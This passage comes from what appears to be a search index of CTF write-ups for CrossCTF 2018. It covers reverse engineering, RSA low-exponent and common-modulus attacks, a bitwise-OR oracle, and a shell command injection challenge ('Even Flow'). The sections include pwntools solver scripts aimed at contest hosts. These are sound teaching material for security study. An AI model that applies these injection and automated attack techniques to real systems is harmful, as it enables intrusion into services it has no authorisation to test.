checks it gives us a seed that can be used to generate the flag. Hmm, suddenly there's v12 and v10 which we did not initialize at the start. We need to know what they are since the whole control flow relies on them. Looking back at the top of our original pseudocode char v8; // [rsp+10h] [rbp-460h] char v9; // [rsp+20h] [rbp-450h] int v10; // [rsp+24h] [rbp-44Ch] char v11; // [rsp+30h] [rbp-440h] int v12; // [rsp+34h] [rbp-43Ch] char v13; // [rsp+40h] [rbp-430h] char v14; // [rsp+50h] [rbp-420h] char v15; // [rsp+60h] [rbp-410h] We see that each mpz value, v8 , v9 , v11 , v13 and v14 are 16 bytes away from each other on the stack. So they all probably are 16 bytes long. On the other hand, v10 points to the address at an offset of 4 bytes from the address of v9 , and same for v12 and v11 .","title":"pseudocode"},{"location":"/crossctf-finals2018/re/perfect/#mpz-internals","text":"To confirm our doubts, we refer to the manual . We see that each mpz_t variable is a struct with the following fields.","title":"mpz internals"},{"location":"/crossctf-finals2018/re/perfect/#95mp_size","text":"The number of limbs, or the negative of that when representing a negative integer. Zero is represented by _mp_size set to zero, in which case the _mp_d data is unused.","title":"_mp_size"},{"location":"/crossctf-finals2018/re/perfect/#95mp_d","text":"A pointer to an array of limbs which is the magnitude. These are stored \u201clittle endian\u201d as per the mpn functions, so _mp_d[0] is the least significant limb and _mp_d[ABS(_mp_size)-1] is the most significant. Whenever _mp_size is non-zero, the most significant limb is non-zero.","title":"_mp_d"},{"location":"/crossctf-finals2018/re/perfect/#95mp_alloc","text":"_mp_alloc is the number of limbs currently allocated at _mp_d , and naturally _mp_alloc = ABS(_mp_size) . When an mpz routine is about to (or might be about to) increase _mp_size , it checks _mp_alloc to see whether there\u2019s enough space, and reallocates if not. MPZ_REALLOC is generally used for this. But the manual didn't tell us which field is at which offset. So, we used onlinegdb to test it out, using the following code. #include stdio.h #include gmp.h int main() { mpz_t g; printf( _mp_size\\t%d\\n , (size_t) (g- _mp_size)-(size_t) g); printf( _mp_d\\t\\t%d\\n , (size_t) (g- _mp_d)-(size_t) g); printf( _mp_alloc\\t%d\\n , (size_t) (g- _mp_alloc)-(size_t) g); return 0; } We get the following output _mp_size 4 _mp_d 8 _mp_alloc 0 So, v10 and v12 are pointing the _mp_size field of v9 and v11 . Checking if they are 0 is equivalent to checking if v9 and v11 are equal to 0. Cleaning up our pseudocode scanf( %1023s , v15) v11 = int(v15) - 1 v13 = int(v15) while (v11 != 0) { if (v13 % v11 == 0) v8 += v11 v11--; } if (v13 == v8 v13 2^213) print random_seed( + v8 + ) puts( k = \\ \\ .join([chr(random.randint(0, 255)) for i in range(35)]) ); puts( xor(k, 754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db) ); We see above that v8 is the sum of all factors of v13 , then the program checks if it is equal to our original input, and if it is greater than 2^213. Then, our seed will just be our input number. This means we are looking for perfect numbers greater than 2^213.","title":"_mp_alloc"},{"location":"/crossctf-finals2018/re/perfect/#solution","text":"Since there are a lot of numbers satisfying the condition, we take a few p s from the wikipedia page, and try them out. We will not run the program with these numbers, since it would take very long. Cleaning up the code that is supposedly given import random from pwn import * nums = [107, 127, 521, 521, 607, 1279] def perfectexp(p): return (2**(p-1))*(2**p-1) def run(x): random.seed(perfectexp(x)) k = .join([chr(random.randint(0, 255)) for i in range(35)]) print(xor(k, '754e26ccd4b1bfafb3ffbdaa748780b7f0e0c3ae9acc3c008670f0fafd34f8ffa596db'.decode('hex'))) for i in nums: run(i) Running it gives us H\\x88*]\\xb6\\xa3\\x8e\ufffd$\ufffdQ\ufffd5U\ufffdkNn{-\ufffd\ufffd\ufffd_\ufffd\ufffdh\ufffd \ufffd7mZ\\x8d CrossCTF{why_am_1_aw4ke_r1ght_n0ww} qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c qF V\\x18\\x8e\\x9a.\ufffdLQ1\\x9c\\xbc\\xa4]\\x0f\ufffd\ufffd\ufffdem\\xa3c%V\\x1b\ufffd\u0016\\x18\\xa2\\xae@S\\x9c \ufffd\ufffd\\\ufffd\ufffd{\ufffd-\ufffd?3l]L\\x92B *9[M\ufffd\ufffd=\ufffd@\ufffd\ufffd\ufffd\ufffdg\ufffd 4~qB\\xaf\ufffd^=\\x0f\ufffdw\ufffd5p\u0011 \\xbe\ufffdy\ufffdi\\xa4o\ufffd\ufffd^\\x88 \\x81 \ufffd;\ufffd","title":"Solution"},{"location":"/crossctf-finals2018/re/rochefort6/","text":"CrossCTF Finals 2018 : Rochefort 6 Nothing like a Rochefort 6 in the hot summer weather... nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) binary This challenge uses the same binary as Rochefort 8 Challenge At first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge. Opening up the function for 6 in IDA gives us unsigned __int64 sub_400AC3() { signed __int64 v0; // r12 unsigned int v1; // eax int v2; // eax unsigned int v3; // er13 __int64 v4; // r14 char s; // [rsp+0h] [rbp-430h] unsigned __int64 v7; // [rsp+408h] [rbp-28h] v0 = 20LL; v7 = __readfsqword(0x28u); v1 = time(0LL); srand(v1); do { v2 = rand(); v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2 48)) - ((unsigned int)(v2 31) 16); puts( Bet you can't produce the same output :P ); printf( %d\\n , v3); puts( Your turn: ); if ( !fgets( s, 1024, stdin) ) { puts( Couldn't read your input. ); exit(1); } v4 = (unsigned int)sub_400A7F((unsigned __int8 *) s, strlen( s)); printf( Your output is %d\\n , v4); if ( v3 != (_DWORD)v4 ) { puts( FAIL ); exit(2); } --v0; } while ( v0 ); sub_400C0A(); return __readfsqword(0x28u) ^ v7; } In short, what the program does is it generates a random number, performs some bit shifting on it.","title":"CrossCTF Finals 2018 : Rochefort 6"},{"location":"/crossctf-finals2018/re/rochefort6/#crossctf-finals-2018-rochefort-6","text":"Nothing like a Rochefort 6 in the hot summer weather... nc ctf.pwn.sg 16667 Creator - waituck (@wongwaituck) binary This challenge uses the same binary as Rochefort 8","title":"CrossCTF Finals 2018 : Rochefort 6"},{"location":"/crossctf-finals2018/re/rochefort6/#challenge","text":"At first the program prompts for a number, 6 would execute the code for this challenge, while 8 for the other challenge. Opening up the function for 6 in IDA gives us unsigned __int64 sub_400AC3() { signed __int64 v0; // r12 unsigned int v1; // eax int v2; // eax unsigned int v3; // er13 __int64 v4; // r14 char s; // [rsp+0h] [rbp-430h] unsigned __int64 v7; // [rsp+408h] [rbp-28h] v0 = 20LL; v7 = __readfsqword(0x28u); v1 = time(0LL); srand(v1); do { v2 = rand(); v3 = (unsigned __int16)(v2 + ((unsigned __int64)v2 48)) - ((unsigned int)(v2 31) 16); puts( Bet you can't produce the same output :P ); printf( %d\\n , v3); puts( Your turn: ); if ( !fgets( s, 1024, stdin) ) { puts( Couldn't read your input. ); exit(1); } v4 = (unsigned int)sub_400A7F((unsigned __int8 *) s, strlen( s)); printf( Your output is %d\\n , v4); if ( v3 != (_DWORD)v4 ) { puts( FAIL ); exit(2); } --v0; } while ( v0 ); sub_400C0A(); return __readfsqword(0x28u) ^ v7; } In short, what the program does is it generates a random number, performs some bit shifting on it.","title":"Challenge"},{"location":"/crossctf-quals2018/","text":"CrossCTF Quals 2018 Pwn Easynote binary exploit Even Flow writeup binary exploit Impossible Shellcoding binary exploit Quiet Moon binary exploit Real Baby Pwnable binary exploit Skipping Rope binary exploit Reverse Engineering GoGoGo Manual Labour Misc CYOA writeup Crypto Lossy ORacle writeup script exploit flag BabyRSA writeup exploit BabyRSA2 writeup exploit Web QuirkyScript 1 QuirkyScript 2 QuirkyScript 3 QuirkyScript 4 QuirkyScript 5 Baby Web","title":"CrossCTF Quals 2018"},{"location":"/crossctf-quals2018/#crossctf-quals-2018","text":"","title":"CrossCTF Quals 2018"},{"location":"/crossctf-quals2018/#pwn","text":"","title":"Pwn"},{"location":"/crossctf-quals2018/#easynote","text":"binary exploit","title":"Easynote"},{"location":"/crossctf-quals2018/#even-flow","text":"writeup binary exploit","title":"Even Flow"},{"location":"/crossctf-quals2018/#impossible-shellcoding","text":"binary exploit","title":"Impossible Shellcoding"},{"location":"/crossctf-quals2018/#quiet-moon","text":"binary exploit","title":"Quiet Moon"},{"location":"/crossctf-quals2018/#real-baby-pwnable","text":"binary exploit","title":"Real Baby Pwnable"},{"location":"/crossctf-quals2018/#skipping-rope","text":"binary exploit","title":"Skipping Rope"},{"location":"/crossctf-quals2018/#reverse-engineering","text":"","title":"Reverse Engineering"},{"location":"/crossctf-quals2018/#gogogo","text":"Manual Labour","title":"GoGoGo"},{"location":"/crossctf-quals2018/#misc","text":"","title":"Misc"},{"location":"/crossctf-quals2018/#cyoa","text":"writeup","title":"CYOA"},{"location":"/crossctf-quals2018/#crypto","text":"","title":"Crypto"},{"location":"/crossctf-quals2018/#lossy-oracle","text":"writeup script exploit flag","title":"Lossy ORacle"},{"location":"/crossctf-quals2018/#babyrsa","text":"writeup exploit","title":"BabyRSA"},{"location":"/crossctf-quals2018/#babyrsa2","text":"writeup exploit","title":"BabyRSA2"},{"location":"/crossctf-quals2018/#web","text":"","title":"Web"},{"location":"/crossctf-quals2018/#quirkyscript-1","text":"","title":"QuirkyScript 1"},{"location":"/crossctf-quals2018/#quirkyscript-2","text":"","title":"QuirkyScript 2"},{"location":"/crossctf-quals2018/#quirkyscript-3","text":"","title":"QuirkyScript 3"},{"location":"/crossctf-quals2018/#quirkyscript-4","text":"","title":"QuirkyScript 4"},{"location":"/crossctf-quals2018/#quirkyscript-5","text":"","title":"QuirkyScript 5"},{"location":"/crossctf-quals2018/#baby-web","text":"","title":"Baby Web"},{"location":"/crossctf-quals2018/CYOA/","text":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc) Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+ Challenge We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry. Interpreting the hints Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 - C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"},{"location":"/crossctf-quals2018/CYOA/#choose-your-own-adventure-crossctf-quals-2018-misc","text":"Maybe your question was too long. You reduced the length of your question and asked the oracle again: \"Where's the flag?\" As expected, she had no reaction again. You sigh... maybe the solution really was in there after all. You close your eyes and started willing yourself back into the enemy's base... Non-standard flag format: [A-Z0-9]+","title":"Choose Your Own Adventure - CrossCTF Quals 2018 (misc)"},{"location":"/crossctf-quals2018/CYOA/#challenge","text":"We are given the hints in this format: 01 01 02, Score: 04 You contribute to the puddle of urine in the corner of this room. Scribbled into the wall is the number 17. Below in red, the number 0 was written. Where would you like to move? 6 -- Down 9 -- Quit 1-6 are used to navigate the location to collect all the hints . And we are also given 4 hints to solve the challenge: Hint 1 for CYOA: len(flag) = 9 Think outside the box for this challenge. It's less of a ctf challenge and more of a misc puzzle tbh... Think about how the contents of each room relate to the coordinates and the score. So now that you can match why each object is in a specific room (with a certain coordinate and score), perhaps think about the scribblings. What's the meaning behind the scribbles? You are looking for a string of characters that leads to the final flag. Link each object in the rooms to the coordinates and figure out the overarching theme of the puzzle. And the words reduced, reaction and solution are italicized, suggesting the topic is chemistry.","title":"Challenge"},{"location":"/crossctf-quals2018/CYOA/#interpreting-the-hints","text":"Consider the hint above, urea is one component of urine, with chemical formula CO(NH2)2 - C1O2N2H4, which corresponds to the coordinates(01 01 02) and the score(04). With this in mind we check all the other 19 hints and get all the chemicals . The scribbles in the wall are also unique, ranging from 0 to 19, which suggests the chemicals can be sorted. Scribble Chemical Red no. 0 acetone 1 1 acetic acid 0 2 propene 0 3 nitrous oxide 6 4 acetic acid 0 5 nitrogen 1 6 acetone 1 7 nitrogen 1 8 ozone 3 9 null 0 10 nitrogen 1 11 ozone 3 12 null 0 13 formaldehyde 0 14 ammonia 3 15 water 4 16 methane 0 17 urea 0 18 glycerol 1 19 acetic acid 0 To solve the challenge, we take the (Red no.)th element of the chemical's common name and list them out capsaicin in formula Flag: C18H27NO3","title":"Interpreting the hints"},{"location":"/crossctf-quals2018/crypto/BabyRSA/","text":"BabyRSA - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common prime factor attack If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime. Low exponent attack Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same Chinese remainder theorem Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"BabyRSA - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#babyrsa-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all the values. out.txt .","title":"BabyRSA - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the exponents are the same.","title":"Challenge"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#vulnerability","text":"","title":"Vulnerability"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#common-prime-factor-attack","text":"If the random prime generator is flawed, it could produce 2 prime numbers that are the same, and the message can easily be found by calculating p and q, however, every single pair of primes is coprime.","title":"Common prime factor attack"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#low-exponent-attack","text":"Another option is if c=m e , we can just calculate m=c 1/e and we're done. This would require the exponent to be much smaller compared to the modulus. Since we're given many pairs of c,n,e, we can use the Chinese Remainder Theorem to calculate m e (mod n1*n2*n3...), then we can take the 257th root. This assumes message remains the same","title":"Low exponent attack"},{"location":"/crossctf-quals2018/crypto/BabyRSA/#chinese-remainder-theorem","text":"Let N be the product of all the modulus Let N i =N/n i Find integers M i and m i such that M i N i +m i n i =1. Now calculate C=\u03a3c i M i M i mod N C=c i mod n i for all i N is now much larger than 257, so we can just take C 1/e and we're done. exploit Flag: crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}","title":"Chinese remainder theorem"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/","text":"BabyRSA2 - CrossCTF Quals 2018 (crypto) Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt . Challenge We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same. Vulnerability RSA Algorithm Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n) Common modulus attack Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"BabyRSA2 - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/#babyrsa2-crossctf-quals-2018-crypto","text":"Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all the values... AGAIN! out.txt .","title":"BabyRSA2 - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/#challenge","text":"We're give a list of RSA n(modulus),e(exponent),c(ciphertext) We notice that all the modulus are the same.","title":"Challenge"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/#vulnerability","text":"","title":"Vulnerability"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/#rsa-algorithm","text":"Firstly, 2 distinct primes are chosen, p and q Calculate the modulus with n=pq Calculate \u03bb(n)=lcm(p-1,q-1) Choose the exponent e such that 1 e \u03bb(n) and e and n are coprime Calculate d=e-1 (mod \u03bb(n)) Calculate the ciphertext c with c=m e (mod n) Decryption is done with m=c d (mod n)","title":"RSA Algorithm"},{"location":"/crossctf-quals2018/crypto/BabyRSA2/#common-modulus-attack","text":"Since pq mod n=(p mod n)(q mod n)mod n and m a m b =m ab , if we can find numbers x 1 x 2 ... such that \u03a3x i e i =1, then we can calculate m 1 , assuming all the messages are the same. B\u00e9zout's identity states that if x and y are coprime, then integers a,b exists such that ax+by=1, however, all our exponents share common prime factors, even any 4 exponents share a common factor. However, all 5 exponents do not share a common factor, thus, it is possible to find x 1 x 2 ... such that \u03a3x i e i =1. We can use the extended Euclidean algorithm, however, the numbers resulting from it could be pretty huge, so the equation is evaluated by Mathematica, giving us x=[3239,237,735,556,-6676]. For negative numbers, we can calculate the inverse modulo pretty quickly, and evaluating \u03a0m x i e i (mod n) gives us the flag. exploit Flag: crossctf{RSA_Challenges_Are_Too_Easy}","title":"Common modulus attack"},{"location":"/crossctf-quals2018/crypto/lossyoracle/","text":"LossyORacle - CrossCTF Quals 2018 (crypto) No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius) Challenge We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode( utf-8 )) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key) Vulnerability Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0. Bitwise OR The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key. Bitwise AND Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag! Exploit Get many ciphertexts First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same. AND them all! We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) Combining all together Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file. Reading the flag While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"LossyORacle - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#lossyoracle-crossctf-quals-2018-crypto","text":"No one believes I can recover the message from this crappy ORacle. nc ctf.pwn.sg 1401 Creator - prokarius (@prokarius)","title":"LossyORacle - CrossCTF Quals 2018 (crypto)"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#challenge","text":"We are given a service that runs the python script lossyoracle.py . We can connect to the service using nc and it will spit out the encrypted flag. The script reads the flag file, then encrypts it with a key using the following function. def encrypt(data, key, func): length = len(key) output = [] for i in range(len(data)): output.append(func(data[i],key[i%length])) return bytes(output) From the following code, we notice that func over here is just a bitwise OR (|) operation applied to each byte in the flag with the key. function = [lambda x,y:x y, lambda x,y:x|y] print (base64.b64encode(encrypt(data, key, function[1])).decode( utf-8 )) One problematic thing is, the key is always random. Not only that the bytes in the key are random every time, but the length of the key is also random every time! key = [] for i in range(random.randrange(64,128)): key.append(random.randrange(0,255)) key = bytes(key)","title":"Challenge"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#vulnerability","text":"Or maybe it is not problematic for us, but a helpful vulnerability instead. For the following, we will refer to ON as a bit being equal to 1, while OFF as a bit being equal to 0.","title":"Vulnerability"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#bitwise-or","text":"The property of a bitwise OR operation is that bits that are ON (equal to 1) will always stay ON, no matter what the bit is ORed with. This means, for each byte in the flag, for every single bit in them, as long as they are ON, no matter what key is used, they will always be ON after encryption. On the other hand, for bits in the flag that are OFF, sometimes, since the key is randomly generated, they may end up still being OFF after encryption. This means, we can take a lot different ciphertexts, and in at least one of them, the bits that are supposed to be OFF in the original flag must be OFF, since they definitely can't be ON forever, considering we are using a randomly generated key.","title":"Bitwise OR"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#bitwise-and","text":"Now, the property of a bitwise AND operation is that bits that are OFF (equal to 0) will always stay OFF, no matter what the bit is ANDed with. So, we can just apply the bitwise AND operation on many different ciphertexts together. How this works is that bits that are ON in the flag are ON forever regardless of the key, so even after applying bitwise AND on so many different ciphertexts they will still be ON. On the other hand, if we have many different ciphertexts, there must be at least one occurence where a bit that is originally OFF stays OFF, as the corresponding part of the key encrypting it may be OFF as well. By applying bitwise AND on all the ciphertexts together, this bit will be turned OFF. So, the final result would be a set of bytes, which has the same bits as the flag that are ON, and the same bits that are OFF, which is the flag!","title":"Bitwise AND"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#exploit","text":"","title":"Exploit"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#get-many-ciphertexts","text":"First thing we need is to automate the process of getting ciphertexts since we need A LOT of them. We can easily do it using pwntools. from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 Along the way, we also convert the message to the correct encoding, and add a safety check to make sure the number of bytes received is always the same.","title":"Get many ciphertexts"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#and-them-all","text":"We can write a simple python function to do the bitwise AND between two strings for us. We initialize message to be a bunch of \\xff bytes, which means all bits in it are ON at the start. message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))])","title":"AND them all!"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#combining-all-together","text":"Our final solution is from pwn import * import base64 HOST = 'ctf.pwn.sg' PORT = 1401 message = '\\xff' * 14160 def and_strings(s1, s2): return ''.join([chr(ord(s1[i]) ord(s2[i])) for i in range(len(s1))]) for i in range(500): print i r = remote(HOST, PORT) m = base64.b64decode(r.readall().strip().encode('utf-8')) assert len(m) == 14160 message = and_strings(message, m) open('flag', 'w').write(message) At first, I tried to read the flag on the terminal, but I get a bunch of unreadable bytes. I was confused and doubted my solution. But then, I remembered it was 14kb of data, sounds more likely to be a file. So, open('flag', 'w').write(message) was added to save the decrypted flag in a file.","title":"Combining all together"},{"location":"/crossctf-quals2018/crypto/lossyoracle/#reading-the-flag","text":"While doing file flag , I get flag: MPEG ADTS, layer III, v2, 16 kbps, 24 kHz, Monaural A MPEG file! Play it using mpg123 flag and we get the flag!","title":"Reading the flag"},{"location":"/crossctf-quals2018/pwn/evenflow/","text":"Even Flow - CrossCTF Quals 2018 (pwn) Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon) Challenge We are given a python script that is ran upon connection to the challenge server. Mainly, it reads in 2 strings. First, a string that is called \"flag\", and then another string consisting of only 2 bytes called \"shell\". sys.stdout.write( Flag: ) sys.stdout.flush() flag = sys.stdin.readline().strip() sys.stdout.write( Shell: ) sys.stdout.flush() shell = sys.stdin.read(2) The \"flag\" would be passed as an argument into the evenflow binary, while the \"shell\" is just being passed to echo . os.system( ./evenflow + flag + ; echo \\ + shell + \\ ); We were also given the source of evenflow , which just reads the flag from a file, and performs strcmp on the \"flag\" that we passed in and the actual flag. size_t get_file_size(char * filename) { struct stat st; stat(filename, st); return st.st_size; } int main(int argc, char ** argv) { FILE * fd = fopen( flag , r ); size_t file_size = get_file_size( flag ); char * buffer = malloc(file_size); fread(buffer, 1, file_size, fd); return strcmp(buffer, argv[1]); } The interesting part of this code is the last line, return strcmp(buffer, argv[1]); According to documentation, strcmp will return a number that says how far the first differing character is away from each other. Exploit $? In a shell, $? contains the return value of the previous command. Since we are allowed to pass a string of 2 bytes to echo , we can just send in $? for \"shell\". So, we can call echo $? which will give us the return value of ./evenflow flag , which will let us know how far away is the first differing character from the actual flag. With this information, we can keep \"correcting\" our flag until we get the actual flag. Script We can write a script to automate this process. from pwn import * def tryf(flag): p = remote('ctf.pwn.sg', 1601) p.sendlineafter('Flag: ', flag) p.sendlineafter('Shell: ', '$?') # returns the return value of evenflow return int(p.recvline()) # The Idea: # Basically, we compare the actual flag to 0 , # Then adjust it based on the output of strcmp (the exit code) # e.g. to C , then add a 0 = C0 # and repeat till we get } , the end of the flag s = 0 while True: i = tryf(s) # adjust! c = chr(ord('0')+i) s = s[:-1] + c if s[-1] == '}': print(s) break s+='0'","title":"Even Flow - CrossCTF Quals 2018 (pwn)"},{"location":"/crossctf-quals2018/pwn/evenflow/#even-flow-crossctf-quals-2018-pwn","text":"Do you like shell command injection? nc ctf.pwn.sg 1601 Creator - amon (@nn_amon)","title":"Even Flow - CrossCTF Quals 2018 